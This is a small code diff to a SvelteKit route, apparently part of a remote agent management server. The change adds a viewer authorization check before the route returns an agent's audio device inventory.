@@ -2,12 +2,15 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
 import type { AudioDeviceInventory } from '$lib/types/audio';
+import { requireViewer } from '$lib/server/authorization';
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	const state = audioBridgeManager.getInventoryState(id);
 	return json(state);
